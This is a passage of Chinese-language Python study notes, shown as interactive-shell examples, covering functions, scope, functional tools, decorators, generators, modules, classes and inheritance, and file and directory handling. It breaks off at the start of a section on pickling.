&gt;&gt;&gt; func(x = 1, y = 2, z = 3, j = 4) {&apos;y&apos;: 2, &apos;x&apos;: 1, &apos;z&apos;: 3, &apos;j&apos;: 4} 混合参数函数头定义参数列表时，可以同时包含位置参数、默认参数、关键字参数、可变参数 通过混合参数的方式，可以接收和处理更加复杂的内容 混合参数需要按照特定位置放置 位置参数(必备参数）-&gt; 默认参数 -&gt; 可变参数（* -&gt; **） &gt;&gt;&gt; def func(x, y = 1, *tuple, **dict): ... print x ... print y ... print tuple ... print dict ... &gt;&gt;&gt; func(10,20,30,40,z=1,j=50) 10 20 (30, 40) {&apos;z&apos;: 1, &apos;j&apos;: 50} 变量作用域局部变量 在函数内部定义的变量称为局部变量 变量作用域指的是该变量能够被使用的范围 局部变量只能在其所属函数中使用 在函数外面，不能访问函数的局部变量。 &gt;&gt;&gt; def var(x,y): ... s = x - y ... print(s) ... &gt;&gt;&gt; var(5,1) s为函数var的变量，由x和y参数的表达式组成 4 由于s的作用域在函数内部，所以无法在外部调用此变量 &gt;&gt;&gt; s Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; NameError: name &apos;s&apos; is not defined &gt;&gt;&gt; print(s) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; NameError: name &apos;s&apos; is not defined &gt;&gt;&gt; def A(): ... a = 1 ... print(a) ... &gt;&gt;&gt; def B(): ... a = 2 ... print(a) ... &gt;&gt;&gt; a = 3 &gt;&gt;&gt; A() 1 &gt;&gt;&gt; B() 2 &gt;&gt;&gt; a 3 全局变量在函数外部定义的变量称为全局变量 全局变量能被整个程序范围调用 &gt;&gt;&gt; name =&apos;JAY&apos; &gt;&gt;&gt; def hello(): ... print(&apos;HI&apos;,name) 调用外部变量 ... &gt;&gt;&gt; hello() HI JAY &gt;&gt;&gt; name = &apos;JAY&apos; 外部变量name &gt;&gt;&gt; def hello(): ... name = &apos;James&apos; 函数内部变量name ... print(&apos;HI&apos;,name) 这里调用变量name，若函数内部有则调用内部，若没 &gt;&gt;&gt; hello() 有，调用外部；若外部也没有，报错 HI James &gt;&gt;&gt; name = &apos;JAY&apos; &gt;&gt;&gt; def hello(): ... global name 调用外部变量 ... name = &apos;J&apos; 进行重新赋值 ... print(&apos;HI&apos;,name) ... &gt;&gt;&gt; hello() HI J &gt;&gt;&gt; name 外部变量被修改 &apos;J&apos; 进阶函数式编程函数式编程是一种高级的编程方法，采用一系列的函数来解决问题 函数式编程是一种面向过程的实现，数据经过函数不断输入输出处理 函数式编程采用高阶函数来实现复杂的处理 高阶函数是一种高级函数，至少包含以下条件之一： 函数作为参数被传入 函数作为结果被输出 Python可以支持高阶函数，通过高阶函数可以实现函数式编程。 支持递归、闭包、装饰器等高级特性 Python实现部分的函数式编程，函数输入允许有变量 纯函数式编程输入没有变量，输出是固定的 含变量的输入，输出结果会发生变动，有副作用 内置高阶函数lambda函数匿名函数，当需要一个函数，但是不需要这个函数的名字的时候，则可以通过lambda表达式来实现 通过lambda表达式，减少程序中的函数名字和代码量，实现更简洁的代码 lambda 参数：表达式 lambda x, y: x + y &gt;&gt;&gt; lambda x,y:x + y &lt;function &lt;lambda&gt; at 0x0000000003313620&gt; &gt;&gt;&gt; a = lambda x,y:x + y &gt;&gt;&gt; a(1,2) 3 &gt;&gt;&gt; b = lambda x,y = 2:x + y &gt;&gt;&gt; b(1) 3 &gt;&gt;&gt; b(2) 4 &gt;&gt;&gt; c = lambda *z:z &gt;&gt;&gt; c(1) (1,) &gt;&gt;&gt; c(1,2) (1, 2) &gt;&gt;&gt; c(3) (3,) map函数map函数接收两个参数，第一个是函数，第二个是列表（可迭代对象） 将函数作用在序列的每个元素上， 然后创建由每次函数应用组成的返回值列表 map函数能够用列表解析表达式来实现 map( 函数，列表） &gt;&gt;&gt; list(map((lambda x:x*x),[1,2,3])) [1, 4, 9] reduce函数reduce跟map类似，也是接收函数和列表 区别在于reduce将列表中两个元素放入函数计算并得到值，然后将此值与列表的下一个元素放入函数计算得到另外一个值 reduce这种“折叠”的处理方式，最终可以得到一个值 reduce( 函数，列表） reduce每次从列表中取出2个元素放入函数 reduce(func, [1, 2, 3])→func(func(1, 2), 3) &gt;&gt;&gt; from functools import reduce &gt;&gt;&gt; reduce ((lambda x,y: x + y),[1,2,3,4]) 10 reduce在py3.0.0之后就除名了，想要使用就必须调用from functools import reduce filter函数filter函数是一个过滤函数，根据True或False来决定最终结果，如果是True则保留下来 filter( 函数，列表） &gt;&gt;&gt; def pos(n): ... return n &gt; 0 ... &gt;&gt;&gt; list(filter(pos,[-1,1,0,-2,3])) [1, 3] &gt;&gt;&gt; def odd(n): ... return n % 2 == 1 ... &gt;&gt;&gt; list(filter(odd,range(10))) [1, 3, 5, 7, 9 返回函数函数作为结果被输出 内置函数中如map函数，是将函数作为输入 &gt;&gt;&gt; def sum2(x,y): ... def sum1(): ... return x + y ... return sum1 ... &gt;&gt;&gt; s = sum2(1,2) &gt;&gt;&gt; s() 3 &gt;&gt;&gt; s = sum2(1,3) &gt;&gt;&gt; s() 4 &gt;&gt;&gt; def closure(): ... i = 10 ... def clo2(): ... return i * i ... return clo2 ... &gt;&gt;&gt; c = closure() &gt;&gt;&gt; c &lt;function closure.&lt;locals&gt;.clo2 at 0x000000000331F0D0&gt; &gt;&gt;&gt; c() 100 闭包如果在一个内部函数里，对在外部作用域（但不是在全局作用域）的变量进行引用，那么内部函数就被认为是闭包（closure）。 例：以上的两个例子 装饰器装饰器（Decorator）采用函数作为参数，然后对此函数进行装饰，增强其功能 装饰器可以为函数增加功能，但是无需修改原有函数内部结构 装饰器是闭包的高阶应用，闭包是内部函数调用外部函数的变量，装饰器是调用函数 第一步，定义装饰器 def deco（func）： def wrapper( )： 函数体包括func( ) return wrapper 第二步，定义函数 def func( )： 函数体 第三步，装饰函数 @deco def func( ) 函数体 不带参数的装饰器&gt;&gt;&gt; def deco(func): ... def wrapper(): ... print(&apos;this is a decorator!&apos;) ... return func() ... return wrapper ... &gt;&gt;&gt; @deco ... def f1(): ... print(&apos;this is a function!&apos;) ... &gt;&gt;&gt; f1() this is a decorator! this is a function! 生成器在 Python 中，带有 yield 的函数被称之为 generator（生成器） 生成器是特定的函数, 允许返回一个值, 然后”暂停”代码的执行, 稍后恢复 使用yield语句一次返回一个结果，在每个结果之间挂起和继续它们的状态通过生成器，可以节省内存空间，使得函数结果散落在不同时间的请求上 yield vs return return返回结果并结束函数 yield返回结果并挂起当前状态，并于下次再次执行 &gt;&gt;&gt; def num(): ... print(&apos;first&apos;) ... yield 1 ... print(&apos;second&apos;) ... yield 2 ... print(&apos;third&apos;) ... yield 3 ... print(&apos;over&apos;) ... &gt;&gt;&gt; n = num() &gt;&gt;&gt; next(n) first 1 &gt;&gt;&gt; next(n) second 2 &gt;&gt;&gt; next(n) third 3 &gt;&gt;&gt; next(n) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration over &gt;&gt;&gt; def squars(N): ... for i in range(N): ... yield i ** 2 ... &gt;&gt;&gt; s = squars(5) &gt;&gt;&gt; s.__next__() 0 &gt;&gt;&gt; s.__next__() 1 &gt;&gt;&gt; s.__next__() 4 &gt;&gt;&gt; s.__next__() 9 &gt;&gt;&gt; s.__next__() 16 &gt;&gt;&gt; s.__next__() Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 模块定义 模块（Module）是一系列函数、变量、类的组成 Python程序是由一系列模块文件组成，一个.py文件就是一个模块 功能提高代码重用率，需要用到某些函数，直接调用某个模块即可，无需重复编写 提高程序层次性，不同功能模块放入不同的模块，逻辑性和层次性提高 方便协作防止冲突 函数和变量在不同模块下可以有同样命名，但是不会冲突 这样多人协作时，即便命名冲突，也不会干扰 原理模块创建用代码编辑器编写代码并保存为py文件 通过IDE编写模块 模块导入语法 import Module 导入整个模块到内存，不覆盖本地命名空间 采用点号调用函数，Module.Func1 不会覆盖本地命名（变量/函数等） from Module import Func 导入模块某个函数到内存 直接调用此函数， Func1 会覆盖本地某个命名（若本地有） from Module import * 导入整个模块到内存 覆盖本地命名空间 直接调用此模块所有函数 会覆盖本地所有命名（若本地有） reload ModulePython只会导入同一模块一次，若再次通过import或者from命令调用同一模块，也不会再次加载，而直接从内存寻找 通过reload关键词可以重新载入该模块（另外一种方式便是重启Python) 若脚本文件有变动，则需要通过reload重新载入 流程搜索 模块路径 编译 编译成字节码.pyc 运行 将模块定义的函数和类等导入运行 一般导入一次之后，再import相同模块则不会再搜索、编译、运行,需要通过reload来实现重新导入 举例&gt;&gt;&gt; import math 调用数学模块 &gt;&gt;&gt; math.sin(10) -0.5440211108893699 模块路径搜索路径导入模块时，路径的搜索按以下的顺序 程序运行目录 程序运行或安装目录 环境变量PYTHONPATH PYTHONPATH是设置包含Python程序文件的目录的列表，这些目录可以是用户定义的或平台特定的目录名 标准库模块目录 标准库模块目录存储Python内置的模块文件Python会自动搜索标准库模块安装在此电脑上的目录 .pth文件 查看路径sys.p python会将模块搜索的路径统一存储在sys模块中的path变量中sys.path 包括程序运行路径、PYTHONPATH、标准库路径等，以列表方式存储 &gt;&gt;&gt; import sys 导入sys模块 &gt;&gt;&gt; sys.path 通过path函数查看标准库路径 配置路径通过函数sys.path增加模块搜索路径 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.path &gt;&gt;&gt; sys.path.append(&quot;C:\\\\PATH&quot;) &gt;&gt;&gt; sys.path &gt;&gt;&gt; import MOD1 C盘路径下创建PATH文件夹并创建MOD1.py模块 通过环境变量PYTHONPATH增加模块搜索路径 通过文件.pth增加模块搜索路径 在site-packages添加一个路径文件，如sitepath.pth，文件中加入要增加模块所在的路径即可 模块互导模块和模块之间可以相互导入 模块中导入内置模块 模块中导入自定义模块 已有路径的情况下直接导入名字，没有路径的情况下要加入路径 sys.path.append(&#39;/users/jaykingchen/MOD&#39;) if __name__ == ‘__main__‘: 模块直接执行时，这个模块的名字为 main_ 模块被导入时，这个模块的名字便是模块本身 所以，当模块直接执行时，这个判断条件成立，if语句后面的代码可以执行 当模块被导入时，这个判断不成立，if语句后面的代码不被执行 一般情况下，在模块里面的测试代码例如print等输出，我们可以放置在这个判断语句后面，这样其他人调用我们的模块时，则不会有额外的输出 进阶命名空间和作用域定义和功能 名称空间（Namespace）是名字和对象的映射 名称空间是一个字典，其中键是名字，值是对象 内建、模块、函数、类都有自己的名称空间 名称空间通过__dict___属性和dir( )函数查看 作用域（Scope）即一个作用范围，表示名称空间可被访问的范围 根据Python的命名空间，可以得到如下的作用域 内部函数的局部作用域 外层函数的局部作用域 模块的全局作用域 Python内置对象的最外层作用域 LEGB查找原则 当引用一个变量时，Python按以下顺序依次进行查找：从本地变量中，在任意上层函数的作用域，在全局作用域，最后在内置作用域中查找。 第一个能够完成查找的就算成功；变量在代码中被赋值的位置通常就决定了它的作用域。 举例Local本地作用域&gt;&gt;&gt; a = 10 全局作用域 &gt;&gt;&gt; def printa(): 本地作用域 ... a = 1 有a变量 ... print(a) 根据LEGB搜索规则，直接调用本地变量 ... &gt;&gt;&gt; printa() 1 &gt;&gt;&gt; a 10 Enclosing作用域&gt;&gt;&gt; a = 10 全局作用域 &gt;&gt;&gt; def printA(): Enclosing作用域 ... a = 1 ... def printa(): ... print(a+2) 根据LEGB原则，本地Local没有变量a，此时调用 ... printa() Enclosing外部函数a ... &gt;&gt;&gt; printA() 3 &gt;&gt;&gt; print(a) 全局作用域/命名空间不被影响 10 Global作用域&gt;&gt;&gt; a = 10 全局作用域 &gt;&gt;&gt; def printa(): 本地作用域，没有a变量 ... print(a) 根据LEGB搜索规则，local和enclosing作用域都没有a变 ... 量，此时直接调用global变量 &gt;&gt;&gt; printa() 10 Bulti-in作用域&gt;&gt;&gt; def printa(): 本地作用域 ... print(abs(-10)) 本地没有abs()函数和变量，通过内置bulti-in作用域查找 ... abs()函数并调用 &gt;&gt;&gt; printa() 10 包（package） 包（Package）是一种层次化的程序组织结构，由一系列子包和模块组成类似模块，可以通过import和from…import语法导入，可以通过点号语法访问 与模块最大不同的是，包通常由模块和init文件组成 包导入语句的路径中的每个目录内都必须有init.py这个文件，否则导入包会失败 __init__.py是一个初始化模块，Python首次导入某个目录时，会自动执行该目录下__init__.py文件中的所有代码 __init__.py文件可以直接是一个空文件，但也可以为包执行初始化语句或设置__all__等变量 语法：import package1.package2.module from package1.package2 import module 包导入环境下，采用from…import语句，可以简化模块/函数/变量的调用，无需输入完整路径 若包目录中，所有模块名字唯一，则可以通过from…import…语句导入，简化模块中函数和变量等调用 若包目录中，有些模块的名字重叠，则需要通过import语句，之后采用点号语法进行函数/变量调用，保证唯一性 面向对象类的基础什么是类定义 类(Class）是设计蓝图（或模型），用来创建不同类型的对象 类是一种数据结构，可以用来定义对象，将数据值和行为特征融合在一起 类指定了对象将包含哪些数据和函数，数据一般是变量即对应值，函数一般我们称之为方法 相当于面包的模具一样 功能对事务进行高度抽象；类是对事务的抽象 提高代码重用率；通过子类和超类，实现类的（多重）继承 提高程序层次性；类支持继承 语法 class ClassName ： 定义类的名称 ‘class documentation string’ #类文档字符串 class_suite #类体 举例&gt;&gt;&gt; class person: ... &apos;The person Class&apos; ... def __init__(self,name,gender,age): 构造函数，用于给实例/对象初始化参数 ... self.name = name 类中第一个函数必须是self，代表实例/ ... self.gender = gender 对象本身 ... self.age = age ... def print_gender(self): ... print(&apos;%s:%s&apos;%(self.name,self.gender)) ... def print_age(self): ... print(&apos;%s:%s&apos;%(self.name,self.age)) 类的实例定义和语法类（Class）是现实世界的抽象的实体以编程形式出现，实例（Instance）则是这些对象的具体化 通过实例化，类的方法/函数才可以调用，这是类的绑定特征 Inst_a = Class( ) 举例&gt;&gt;&gt; class person: ... &apos;The person Class&apos; ... def __init__(self,name,gender,age): ... self.name = name ... self.gender = gender ... self.age = age ... def print_gender(self): ... print(&apos;%s:%s&apos;%(self.name,self.gender)) ... def print_age(self): ... print(&apos;%s:%s&apos;%(self.name,self.age)) ... &gt;&gt;&gt; A = person(&apos;A&apos;,&apos;male&apos;,&apos;10&apos;) 创建实例A，并传入三个参数给构造函数 &gt;&gt;&gt; B = person(&apos;B&apos;,&apos;Female&apos;,&apos;12&apos;) 创建实例B，并传入三个参数给构造函数 &gt;&gt;&gt; A.name &apos;A&apos; &gt;&gt;&gt; A.age &apos;10&apos; &gt;&gt;&gt; B.gender &apos;Female&apos; 类的属性属性概述类的属性由数据和方法两个部分组成，可以通过点号方式来访问 数据属性存储数据和变量值，方法属性存储操作数据的函数 &gt;&gt;&gt; class person(): ... version = 1.0 数据属性 ... def printver(self): 方法属性 ... print(self.version) 方法调用数据 ... &gt;&gt;&gt; p = person() &gt;&gt;&gt; p.version 1.0 &gt;&gt;&gt; p.printver() 1.0 调用语法Inst_a. value1 调用类的数据属性（变量值） Inst_a. method1 调用类的方法属性（函数） 属性操作属性访问访问数据属性数据属性仅仅是所定义的类的变量 数据属性即静态变量和静态数据 类.数据属性 实例.数据属性 访问方法属性类中所定义的函数，称之为方法 方法有应用范围的，只能在类里面 要调用方法，必须先实例化 类函数规则： ①类内部函数与其他函数没有太大区别 ②类中所有函数第一个参数必须是self self就是代表实例自己 创建实例时，实例名代替self ③很多类的第一个函数是__init__构造函数 __init__构造函数用于初始化对象值 通过__init__，在创建实例的时候，不能传入空参数，必须传入与__init__方法匹配的参数 属性修改&gt;&gt;&gt; Person.version 数据属性可以不经过实例化之间由类调用 1.0 &gt;&gt;&gt; DaXiong.version 实例也可以调用数据属性 1.0 &gt;&gt;&gt; DaXiong.version = 2.0 实例可以对属性进行修改 &gt;&gt;&gt; DaXiong.version 2.0 &gt;&gt;&gt; DaXiong.age = 11 修改传入的参数 &gt;&gt;&gt; DaXiong.age 11 实例属性修改不影响类的属性 增加属性&gt;&gt;&gt; DaXiong.score = 59 增加一个score属性，并赋值为59 &gt;&gt;&gt; DaXiong.score 59 只会给实例赋值，不会影响到类 查看属性dir( )： &gt;&gt;&gt; dir(DaXiong) [&apos;__doc__&apos;, &apos;__init__&apos;, &apos;__module__&apos;, &apos;age&apos;, &apos;gender&apos;, &apos;name&apos;, &apos;print_age&apos;, &apos;print_gender&apos;, &apos;score&apos;, &apos;version&apos;] __dict__： &gt;&gt;&gt; DaXiong.__dict__ {&apos;gender&apos;: &apos;male&apos;, &apos;age&apos;: 11, &apos;version&apos;: 2.0, &apos;name&apos;: &apos;Daxiong&apos;, &apos;score&apos;: 59} 特殊类属性这里的特殊类属性以value方式命名，前后都有2个下划线特殊类属性是Python内置属性，所有创建的类默认都有C.__doc__ 类Ｃ的文档字符串： &gt;&gt;&gt; Person.__doc__ &apos;The Person Class&apos; C.__dict__ 类Ｃ的属性： &gt;&gt;&gt; Person.__dict__ {&apos;__module__&apos;: &apos;__builtin__&apos;, &apos;print_age&apos;: &lt;function print_age at 0x106132b18&gt;, &apos;print_gender&apos;: &lt;function print_gender at 0x1061329b0&gt;, &apos;version&apos;: 1.0, &apos;__doc__&apos;: &apos;The Person Class&apos;, &apos;__init__&apos;: &lt;function __init__ at 0x1061328c0&gt;} C.__name__: 类名 C.__module__ 类Ｃ定义所在的模块： &gt;&gt;&gt; Person.__module__ &apos;__builtin__&apos; C.__bases__ : 类的所有父类构成元素 类的进阶继承当编写一个类（Class）时，可以从之前的类进行继承，这样可以获取之前的类的所有属性 新的类称为子类（Subclass），而被继承的类被称为基类/父类/超类（Superclass） &gt;&gt;&gt; class Parent(object): …… &gt;&gt;&gt; class Child(Parent): 子类在父类上创建 创建子类继承判断函数isinstance( ) &gt;&gt;&gt; isinstance(DaXiong, Male) True &gt;&gt;&gt; isinstance(DaXiong, Female) False issubclass( ) &gt;&gt;&gt; issubclass(Male, Person) True &gt;&gt;&gt; issubclass(Female, Person) True 创建子类class A(object): …………………… class B(A): B为子类 方法定制 类中的继承方法搜索规则：实例 -&gt; 子类 -&gt; 父类 子类除了继承父类的属性，还可以自己添加、定制、拓展更多功能 若子类的属性与父类属性名字相同，则以子类属性为主，即子类将父类的方法重写或拓展 定制方法&gt;&gt;&gt; class person: &apos;The person Class&apos; def __init__(self,name,gender,age): self.name = name self.gender = gender self.age = age def print_gender(self): print(&apos;%s:%s&apos;%(self.name,self.gender)) def print_age(self): print(&apos;%s:%s&apos;%(self.name,self.age)) &gt;&gt;&gt; class male(person): ... &apos;The male class&apos; ... def print_gender(self): 子类中方法与父类相同，则根据继承搜索 ... print(&apos;He is %s&apos; % self.gender) 规则，子类方法优先 ... &gt;&gt;&gt; a = male(&apos;a&apos;,&apos;male&apos;,10) &gt;&gt;&gt; a.print_gender() He is male 定制构造函数gender self.age = age def print_gender(self): print(&apos;%s:%s&apos;%(self.name,self.gender)) def print_age(self): print(&apos;%s:%s&apos;%(self.name,self.age)) &gt;&gt;&gt; class male(person): ... &apos;The male class&apos; ... def __init__(self,name,age): ... person.__init__(self,name,&apos;male&apos;,age) ... def print_gender(self): ... print(&apos;HE is %s&apos; % ,self.gender) ... &gt;&gt;&gt; class male(person): ... &apos;The male class&apos; ... def __init__(self,name,age): ... person.__init__(self,name,&apos;male&apos;,age) 调用父类函数，并进行修改 ... def print_gender(self): 直接默认为‘male’ ... print(&apos;HE is %s&apos; % self.gender) ... &gt;&gt;&gt; class female(person): ... &apos;The female class&apos; ... def __init__(self,name,age): ... person.__init__(self,name,&apos;female&apos;,age) ... def print_gender(self): ... print(&apos;She is %s&apos; % self.gender) ... &gt;&gt;&gt; a = male(&apos;a&apos;,10) &gt;&gt;&gt; b = female(&apos;b&apos;,9) &gt;&gt;&gt; a.gender &apos;male&apos; &gt;&gt;&gt; b.gender &apos;female&apos; 默认情况下，构造函数从父类继承；但是有时候有一些参数有默认值，可以直接指定，无需再传入 多重继承 多重继承用于实现子类对多个父类的继承通过多重继承，可以混合不同类的功能，实现更加复杂的需求 class A( ): class B( ): class C(A, B ): &gt;&gt;&gt; class fat(person): ... &apos;the fat class&apos; ... def print_wight(self): ... print(&apos;fat&apos;) ... &gt;&gt;&gt; class thin (person): ... &apos;the fat class&apos; ... &gt;&gt;&gt; class thin (person): ... &apos;the thin class&apos; ... def print_weight(self): ... print(&apos;thin&apos;) ... &gt;&gt;&gt; class mf(male,fat): 多重继承 ... pass ... &gt;&gt;&gt; class ft(female,thin): 多重继承 ... pass ... &gt;&gt;&gt; a = mf(&apos;a&apos;,10) &gt;&gt;&gt; b = ft(&apos;b&apos;,9) &gt;&gt;&gt; print(a.print_wight()) fat None &gt;&gt;&gt; print(b.print_weight()) thin None 多态多态是面向对象语言的一个基本特性，多态意味着变量并不知道引用的对象是什么，根据引用对象的不同表现不同的行为方式 &gt;&gt;&gt; from random import choice &gt;&gt;&gt; obj = choice([a,b]) &gt;&gt;&gt; print(obj.print_gender()) HE is male None &gt;&gt;&gt; obj = choice([a,b]) &gt;&gt;&gt; print(obj.print_gender()) HE is male None &gt;&gt;&gt; obj = choice([a,b]) &gt;&gt;&gt; print(obj.print_gender()) She is female None 私有变量默认情况下，类内部所定义的变量通过点号方法可以访问并修改，这种变量称为公有变量 公有变量可被用户修改，导致对象内部状态不一致，此时便需要私有变量（Private） 私有变量即在原有变量的前面加上两个下划线，例如_ _ value 常规公有变量能被访问并修改&gt;&gt;&gt; class person: &apos;The person Class&apos; def __init__(self,name,gender,age): self.name = name self.gender = gender self.age = age &gt;&gt;&gt; a = person(&apos;a&apos;,&apos;male&apos;,10) &gt;&gt;&gt; a.age 10 &gt;&gt;&gt; a.gender &apos;male&apos; &gt;&gt;&gt; a.age = 20 &gt;&gt;&gt; a.age 20 通过私有变量实现访问限制&gt;&gt;&gt; class person: &apos;The person Class&apos; def __init__(self,name,gender,age): self.__name = name 私有变量加入两个下划线 self.__gender = gender self.__age = age &gt;&gt;&gt; a = person(&apos;a&apos;,&apos;male&apos;,10) &gt;&gt;&gt; a.person__name 常规的句点访问方式被拒绝 Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; AttributeError: &apos;person&apos; object has no attribute &apos;person__name&apos; &gt;&gt;&gt; a.person__age Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; AttributeError: &apos;person&apos; object has no attribute &apos;person__age&apos; &gt;&gt;&gt; a._person__age 10 通过点号方式中加入类名可以访问，但是不建议 通过获取函数实现私有变量值访问&gt;&gt;&gt; class person: &apos;The person Class&apos; def __init__(self,name,gender,age): self.__name = name self.__gender = gender self.__age = age def print_gender(self): print(&apos;%s:%s&apos;%(self.__name,self.__gender)) def print_age(self): print(&apos;%s:%s&apos;%(self.__name,self.__age)) &gt;&gt;&gt; a = person(&apos;a&apos;,&apos;male&apos;,10) &gt;&gt;&gt; b = person(&apos;b&apos;,&apos;female&apos;,11) &gt;&gt;&gt; a.print_age() a:10 &gt;&gt;&gt; a.print_gender() a:male 通过设置函数设置条件变量&gt;&gt;&gt; class person: &apos;The person Class&apos; def __init__(self,name,gender,age): self.__name = name self.__gender = gender self.__age = age def set_gender(self,gender): self.__gender = gender def set_age(self,age): if 0 &lt;= age &lt;= 100: self.__age = age &gt;&gt;&gt; def print_gender(self): print(&apos;%s:%s&apos;%(self.__name,self.__gender)) &gt;&gt;&gt; def print_age(self): print(&apos;%s:%s&apos;%(self.__name,self.__age)) &gt;&gt;&gt; a = person(&apos;a&apos;,&apos;male&apos;,10) &gt;&gt;&gt; DaXiong.print_age() Daxiong: 10 &gt;&gt;&gt; DaXiong.set_age(101) &gt;&gt;&gt; DaXiong.print_age() Daxiong: 10 装饰器私有变量章节中，我们通过获取和设置函数，实现更安全的访问和设置 但是，在进行访问和设置时，相对显得比较麻烦？ 有没有更好的方式？实现以下的需求=&gt; 既能检查参数，又能想属性一样方便地访问和修改类的变量 可以让调用者写出简短的代码，同时保证对参数进行必要的检查 这就需要 @property 装饰器来实现了 &gt;&gt;&gt; class person(object): ... def __int__(self,name,gender,age): ... self.__name = name ... self.__gender = gender ... self.__age = age ... &gt;&gt;&gt; @property ... def age(self): ... return self.__age ... &gt;&gt;&gt; @age.setter ... def age(self,value): ... if value &lt; 0 or value &gt;100: ... raise ValueError(&apos;invalid age!&apos;) ... self.__age = value ... 面向对象编程对象基础Python是一种“面向对象编程”的语言，所以Python语言中，一切皆对象！Python语言中，所有能够被处理的、被解决的“东西”，都称之为对象（Object） 本质上讲，对象是一组数据以及能处理这些数据的函数 对象的特征值value：对象表示的数据项 身份id：唯一性身份标志，是该对象的内存地址，可用内建函数id()获得 类型tpye：对象的类型决定了该对象可以保存什么类型的值，可进行什么样的操作，以及遵循什么样的规则，可以type()获得 对象的行为对象的操作、功能、方法等，是一种动态信息。 我们将能对象能做的，统称为 “方法/属性/操作” 方法method 函数function 操作operation 编程方法 围绕“do”解决、处理、流程为依据来进行编程，称为“面向过程编程” 围绕“things”东西、事情、数据为依据来进行编程，称为“面向对象编程” 输入输出输入输出屏幕输出print 在3.x版本，print为一个函数 键盘输入raw_input用于接收键盘输入 i = raw_input( ) s = raw_input(‘请输入您的账号:’) print ‘您的账号是:’, s input用于接入键盘输入，输入内容可以是表达式 i = input( ) s = input(‘请输入您的公式:’) print ‘您的结果是:’, s 文件处理file_object = open(file_name， access_mode, buffering) file_name 是包含要打开的文件名字的字符串, 它可以是相对路径或者绝对路径 文件打开rr 以只读方式打开文件 r+ 以读写方式打开文件 rb 以二进制方式只读打开文件 rb+ 以二进制读写打开文件 ww 以写入方式打开文件 w+ 以读写方式打开文件 wb 以二进制方式写入打开文件 wb+ 以二进制方式读写打开文件 若文件存在，则覆盖 若文件不存在，则创建 aa 以增加方式打开文件，文件指针放在原有内容后面 a+ 以读写方式打开文件，文件指针放在原有内容后面 ab 以二进制方式打开文件并增加内容，文件指针放在原有内容后面 ab+ 以二进制方式读写文件并增加内容，文件指针放在原有内容后面 若文件不存在，则创建 file1 = open(&apos;newfile.txt&apos;, &apos;r&apos;) file1 = open(&apos;newfile.txt&apos;, &apos;w&apos;) file1 = open(&apos;newfile.txt&apos;, &apos;a&apos;) 文件关闭file.close() 关闭文件，结束文件调用，节省内存空间 文件写入file.write() write()方法不会在字符串的结尾添加换行符\\n，若需要换行，需自行添加 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;w&apos;) &gt;&gt;&gt; file1.write(&apos;123\\n456\\n789\\n&apos;) 12 &gt;&gt;&gt; file1.close() 文件读取file.read()读取文件所有字节,可以指定字节数,不指定或未负则读取所有 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;r&apos;) &gt;&gt;&gt; s = file1.read() &gt;&gt;&gt; print(s) 123 456 789 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;r&apos;) &gt;&gt;&gt; s = file1.read(6) &gt;&gt;&gt; print(s) 123 45 file.readline()读取一行,包括’\\n’字符 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;r&apos;) &gt;&gt;&gt; s = file1.readline() &gt;&gt;&gt; print(s) 123 &gt;&gt;&gt; s = file1.readline() &gt;&gt;&gt; print(s) 456 &gt;&gt;&gt; print(s) 456 &gt;&gt;&gt; s = file1.readline() &gt;&gt;&gt; print(s) 789 file.readlines()读取所有行并返回列表，每行返回列表 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;r&apos;) &gt;&gt;&gt; s = file1.readlines() &gt;&gt;&gt; print(s) [&apos;123\\n&apos;, &apos;456\\n&apos;, &apos;789\\n&apos;] 文件增加以a方式打开，代表不覆盖原来内容，在原有基础上增加 file = open(‘file_name’, ‘a’) file.write() 文件偏移file.tell( )表示当前指针所在的位置 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;r+&apos;) &gt;&gt;&gt; print(file1.tell()) 0 &gt;&gt;&gt; file1.write(&apos;add line 1\\n&apos;) 11 &gt;&gt;&gt; print(file1.tell()) 12 file.seek( )指定指针偏移的位置file.seek(off, whence=0) 在文件中移动文件指针, 从 whence ( 0 代表文件其始, 1 代表当前位置，2 代表文件末尾)偏移 off 字节 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;w+&apos;) &gt;&gt;&gt; print(file1.tell()) 0 SyntaxError: invalid syntax &gt;&gt;&gt; file1.seek(10,0) 10 文件重命名导入系统模块 import os os.rename(‘原文件名称’,’重命名文件名称’) 文件删除import os os.remove(‘文件名称’) 目标处理os模块获取目录os.getcwd() 获取当前工作目录 创建目录os.mkdir() 创建新的目录 删除目录os.rmdir( ) 删除指定目录 目录内容os.listdir() 列出指定目录下的文件和文件夹 os.listdir(os.getcwd()) 移动目录os.chdir() 移动当前工作目录到其他目录 os.chdir(&apos;newdir&apos;) os.path模块查询文件os.path.isfile &gt;&gt;&gt; os.path.isfile(&apos;newfile.txt&apos;) True 查询目录os.path.isdir &gt;&gt;&gt; os.path.isdir(&apos;testdir&apos;) False 查询大小os.path.getsize &gt;&gt;&gt; os.path.getsize(&apos;newfile.txt&apos;) 0 &gt;&gt;&gt; file1 = open(&apos;newfile.txt&apos;,&apos;w&apos;) &gt;&gt;&gt; file1.write(&apos;23333&apos;) 5 &gt;&gt;&gt; file1.close() &gt;&gt;&gt; os.path.getsize(&apos;newfile.txt&apos;) 5 序列化我们用Python对象（变量/函数/方法）所进行的操作是在内存中，若Python程序（或系统）关闭，则内存被清除 为了将我们所操作的内容永久存储（保存到硬盘），需要引入”序列化”（顺序化），即pickling/serialization 序列化将复杂数据结构（对象）转换为一个二进制数据集合（数据流）, 这样就可以把数据永久存储或通过网络发送, 然后再重新把数据流恢复原来的对象内容 变量/对象等从内存中变成可存储或传输的过程称之为序列化 pickling提供Python对象的序列化和存储转换功能 pickling.dump( )接收一个文件句柄和一个数据对象作为参数, 